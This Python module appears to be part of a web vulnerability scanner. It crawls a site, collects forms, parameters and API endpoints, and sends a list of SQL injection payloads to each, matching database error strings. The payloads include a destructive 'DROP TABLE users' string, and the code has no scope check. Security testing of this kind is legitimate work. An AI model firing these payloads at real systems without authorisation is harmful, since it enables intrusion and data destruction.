from crawler.selenium_crawler import SeleniumCrawler
import requests
import json, os

SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1 --",
    '" OR "1"="1',
    "' UNION SELECT null,null,null --",
    "'; DROP TABLE users --",
    "1' AND '1'='1",
    "' OR 'x'='x",
    "admin'--",
    "' OR 1=1#",
]

DB_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "syntax error",
    "unclosed quotation", "sqlite", "postgresql", "jdbc",
    "odbc", "microsoft sql", "warning: mysql", "invalid query",
    "you have an error in your sql", "sqlstate",
    "pg_query", "mysql_num_rows", "division by zero",
]


GENERIC_INPUT_PATHS = [
    "/search", "/search?q=test", "/?s=test", "/?q=test",
    "/login", "/signin", "/register", "/signup",
    "/api/search", "/api/users", "/api/login",
    "/api/v1/search", "/api/v1/users",
    "/rest/products/search?q=test",  # Juice Shop
    "/rest/user/login",
]


def collect_input_endpoints(base_url, crawl_results):
    endpoints, seen = [], set()
    base = base_url.rstrip("/")

    # Layer 1: Forms from Selenium
    for form in crawl_results.get("forms", []):
        if form["url"] not in seen:
            seen.add(form["url"])
            endpoints.append({
                "url": form["url"], "method": form["method"],
                "inputs": [i["name"] for i in form["inputs"]],
                "source": "selenium_form",
            })

    # Layer 2: URL params from Selenium
    for p in crawl_results.get("param_urls", []):
        if p["url"] not in seen:
            seen.add(p["url"])
            endpoints.append({
                "url": p["url"], "method": "GET",
                "inputs": p["params"], "source": "selenium_url_param",
            })

    # Layer 3: API calls intercepted by Selenium
    for api_url in crawl_results.get("api_calls", []):
        if api_url not in seen:
            seen.add(api_url)
            endpoints.append({
                "url": api_url, "method": "GET",
                "inputs": ["q"], "source": "selenium_api_intercept",
            })

    # Layer 4: Generic wordlist
    for path in GENERIC_INPUT_PATHS:
        ep_url = base + path
        if ep_url in seen: continue
        try:
            r = requests.get(ep_url, timeout=5)
            if r.status_code not in (404, 410):
                seen.add(ep_url)
                endpoints.append({
                    "url": ep_url, "method": "GET",
                    "inputs": ["q"], "source": "wordlist",
                })
        except Exception:
            pass
    return endpoints

def test_sqli(endpoint):
    url    = endpoint["url"]
    method = endpoint["method"]
    inputs = endpoint["inputs"]

    for payload in SQL_PAYLOADS:
        try:
            if method == "GET":
                resp = requests.get(
                    url, params={field: payload for field in inputs}, timeout=10
                )
            else:
                resp = requests.post(
                    url, json={field: payload for field in inputs}, timeout=10
                )

            body    = resp.text.lower()
            matched = [e for e in DB_ERRORS if e in body]

            if matched:
                return {
                    "type":     "SQL Injection",
                    "url":      url,
                    "severity": "Critical",
                    "detail":   f"SQL Injection CONFIRMED via payload '{payload}'. DB error: '{matched[0]}'",
                }
        except Exception as e:
            print(f"[sql_injection] Error on {url}: {e}")

    return {
        "type":     "SQL Injection",
        "url":      url,
        "severity": "Medium",
        "detail":   f"Tested {len(SQL_PAYLOADS)} payloads — no DB error detected.",
    }



def scan(url):
    crawler = SeleniumCrawler(url, max_pages=15)
    crawl_results = crawler.crawl()
    endpoints = collect_input_endpoints(url, crawl_results) 
    print(f"[sql_injection] Found {len(endpoints)} input endpoints")
    findings = [test_sqli(ep) for ep in endpoints]
    critical = sum(1 for f in findings if f["severity"] == "Critical")
    print(f"[sql_injection] Critical: {critical} / {len(findings)}")

    # critical_findings = [f for f in findings if f["severity"] == "Critical"]

    os.makedirs("results", exist_ok=True)
    with open("results/sql_injection_results.json", "w") as f:
        json.dump(findings, f, indent=2)
    print(f"[sql_injection] Results saved to results/sql_injection_results.json")
    return findings